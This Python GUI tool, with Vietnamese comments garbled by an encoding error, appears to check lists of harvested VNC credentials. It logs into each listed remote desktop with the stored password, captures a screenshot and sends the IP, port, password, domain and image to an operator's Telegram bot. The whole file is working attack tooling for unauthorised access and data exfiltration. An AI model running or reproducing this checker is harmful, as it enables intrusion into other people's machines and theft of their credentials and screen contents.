import tkinter as tk
from tkinter import filedialog, messagebox
import socket
import requests
import threading
import vncdotool.api
import tempfile

# Bi·∫øn to√†n c·ª•c ƒë·ªÉ ki·ªÉm so√°t tr·∫°ng th√°i ch·∫°y c·ªßa qu√° tr√¨nh ki·ªÉm tra
stop_event = threading.Event()

# H√†m ki·ªÉm tra xem m√°y ch·ªß VNC c√≥ kh·∫£ d·ª•ng kh√¥ng
def check_vnc_server(ip, port):
    print(f"ƒêang ki·ªÉm tra m√°y ch·ªß VNC t·∫°i {ip}:{port}")
    try:
        with socket.create_connection((ip, port), timeout=30):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        print(f"L·ªói khi k·∫øt n·ªëi t·ªõi m√°y ch·ªß VNC t·∫°i {ip}:{port}: {e}")
        return False

# H√†m g·ª≠i tin nh·∫Øn ƒë·∫øn bot Telegram
def send_telegram_message(bot_token, chat_id, message):
    print(f"ƒêang g·ª≠i tin nh·∫Øn ƒë·∫øn Telegram chat {chat_id}")
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "HTML"
    }
    response = requests.post(url, data=data)
    print(f"K·∫øt qu·∫£ g·ª≠i tin nh·∫Øn: {response.status_code}")
    return response.status_code == 200

# H√†m g·ª≠i ·∫£nh ƒë·∫øn bot Telegram
def send_telegram_photo(bot_token, chat_id, photo_path, caption):
    print(f"ƒêang g·ª≠i ·∫£nh ƒë·∫øn Telegram chat {chat_id}")
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    with open(photo_path, 'rb') as photo:
        data = {
            "chat_id": chat_id,
            "caption": caption,
            "parse_mode": "HTML"
        }
        files = {
            "photo": photo
        }
        response = requests.post(url, data=data, files=files)
    print(f"K·∫øt qu·∫£ g·ª≠i ·∫£nh: {response.status_code}")
    return response.status_code == 200

# H√†m ch·ª•p ·∫£nh m√†n h√¨nh t·ª´ m√°y ch·ªß VNC
def take_vnc_screenshot(ip, port, password):
    print(f"ƒêang ch·ª•p ·∫£nh m√†n h√¨nh c·ªßa m√°y ch·ªß VNC t·∫°i {ip}:{port}")
    screenshot_path = None
    try:
        with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as tmp_file:
            client = vncdotool.api.connect(f'{ip}::{port}', password=password, timeout=5)
            client.captureScreen(tmp_file.name)
            client.disconnect()
            screenshot_path = tmp_file.name
            print(f"ƒê√£ ch·ª•p xong ·∫£nh m√†n h√¨nh c·ªßa m√°y ch·ªß VNC t·∫°i {ip}:{port}")
    except Exception as e:
        print(f"Kh√¥ng th·ªÉ ch·ª•p ·∫£nh m√†n h√¨nh c·ªßa m√°y ch·ªß VNC {ip}:{port}: {e}")
    return screenshot_path

# H√†m t·∫£i danh s√°ch m√°y ch·ªß VNC t·ª´ t·ªáp
def load_vnc_servers(file_path):
    print(f"ƒêang t·∫£i c√°c m√°y ch·ªß VNC t·ª´ {file_path}")
    servers = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                parts = line.strip().split('-')
                if len(parts) == 3:
                    ip_port, password, domain = parts
                    ip, port = ip_port.split(':')
                    servers.append({
                        "ip": ip,
                        "port": int(port),
                        "password": password,
                        "domain": domain
                    })
    except Exception as e:
        print(f"Kh√¥ng th·ªÉ t·∫£i c√°c m√°y ch·ªß VNC t·ª´ {file_path}: {e}")
    return servers

# H√†m t·∫°o tin nh·∫Øn ƒë·ªãnh d·∫°ng
def create_formatted_message(ip, port, password, domain, type_status):
    message = (
        f"‚ú≥ <b>IP:</b> <code>{ip}</code>\n"
        f"üîí <b>Port:</b> {port}\n"
        f"üîë <b>Password:</b> {password}\n"
        f"üåê <b>Domain:</b> {domain}\n"
        f"‚ö° <b>Type:</b> {type_status}\n"
    )
    return message

# H√†m ki·ªÉm tra m√°y ch·ªß, ch·ª•p ·∫£nh m√†n h√¨nh v√† g·ª≠i k·∫øt qu·∫£ ƒë·∫øn Telegram
def check_servers_and_notify(file_path, bot_token, chat_id, max_workers):
    print("B·∫Øt ƒë·∫ßu ki·ªÉm tra c√°c m√°y ch·ªß v√† th√¥ng b√°o")
    servers = load_vnc_servers(file_path)
    for server in servers:
        if stop_event.is_set():
            break
        ip = server["ip"]
        port = server["port"]
        password = server["password"]
        domain = server["domain"]
        is_available = check_vnc_server(ip, port)
        type_status = "Real Server‚úÖ" if is_available else "Fake Server‚ùå"
        
        if is_available:
            try:
                screenshot_path = take_vnc_screenshot(ip, port, password)
                if screenshot_path:
                    caption = create_formatted_message(ip, port, password, domain, type_status)
                    send_telegram_photo(bot_token, chat_id, screenshot_path, caption)
                else:
                    message = create_formatted_message(ip, port, password, domain, type_status)
                    send_telegram_message(bot_token, chat_id, message)
            except Exception as e:
                print(f"L·ªói khi x·ª≠ l√Ω m√°y ch·ªß {ip}:{port}: {e}")
                continue
        else:
            message = create_formatted_message(ip, port, password, domain, type_status)
            send_telegram_message(bot_token, chat_id, message)

    messagebox.showinfo("Th√¥ng b√°o", "ƒê√£ ho√†n th√†nh ki·ªÉm tra c√°c m√°y ch·ªß v√† g·ª≠i th√¥ng b√°o.")

# H√†m b·∫Øt ƒë·∫ßu ki·ªÉm tra VNC trong m·ªôt lu·ªìng ri√™ng
def start_checking():
    stop_event.clear()
    file_path = results_file_entry.get()
    bot_token = bot_token_entry.get()
    chat_id = chat_id_entry.get()
    max_workers = int(max_workers_entry.get())
    print(f"B·∫Øt ƒë·∫ßu ki·ªÉm tra v·ªõi t·ªáp: {file_path}, bot token: {bot_token}, chat ID: {chat_id}")
    threading.Thread(target=check_servers_and_notify, args=(file_path, bot_token, chat_id, max_workers)).start()

# H√†m d·ª´ng ki·ªÉm tra VNC
def stop_checking():
    print("D·ª´ng qu√° tr√¨nh ki·ªÉm tra")
    stop_event.set()

# H√†m duy·ªát t·ªáp k·∫øt qu·∫£
def browse_file():
    file_path = filedialog.askopenfilename()
    results_file_entry.delete(0, tk.END)
    results_file_entry.insert(0, file_path)

# T·∫°o c·ª≠a s·ªï ·ª©ng d·ª•ng ch√≠nh
app = tk.Tk()
app.title("VNC Checker v√† Bot Telegram")

# Nh·∫≠p t·ªáp k·∫øt qu·∫£
tk.Label(app, text="T·ªáp k·∫øt qu·∫£:").grid(row=0, column=0, sticky=tk.W)
results_file_entry = tk.Entry(app, width=50)
results_file_entry.grid(row=0, column=1, padx=5, pady=5)
browse_button = tk.Button(app, text="Duy·ªát", command=browse_file)
browse_button.grid(row=0, column=2, padx=5, pady=5)

# Nh·∫≠p bot token
tk.Label(app, text="Bot Token:").grid(row=1, column=0, sticky=tk.W)
bot_token_entry = tk.Entry(app, width=50)
bot_token_entry.grid(row=1, column=1, padx=5, pady=5)

# Nh·∫≠p chat ID
tk.Label(app, text="Chat ID:").grid(row=2, column=0, sticky=tk.W)
chat_id_entry = tk.Entry(app, width=50)
chat_id_entry.grid(row=2, column=1, padx=5, pady=5)

# Nh·∫≠p s·ªë l∆∞·ª£ng c√¥ng nh√¢n t·ªëi ƒëa
tk.Label(app, text="S·ªë l∆∞·ª£ng c√¥ng nh√¢n t·ªëi ƒëa:").grid(row=3, column=0, sticky=tk.W)
max_workers_entry = tk.Entry(app, width=50)
max_workers_entry.grid(row=3, column=1, padx=5, pady=5)
max_workers_entry.insert(0, "1000")

# N√∫t B·∫Øt ƒë·∫ßu v√† D·ª´ng
start_button = tk.Button(app, text="B·∫Øt ƒë·∫ßu", command=start_checking)
start_button.grid(row=4, column=0, padx=5, pady=10)
stop_button = tk.Button(app, text="D·ª´ng", command=stop_checking)
stop_button.grid(row=4, column=1, padx=5, pady=10)

# Ch·∫°y v√≤ng l·∫∑p ch√≠nh c·ªßa ·ª©ng d·ª•ng
app.mainloop()

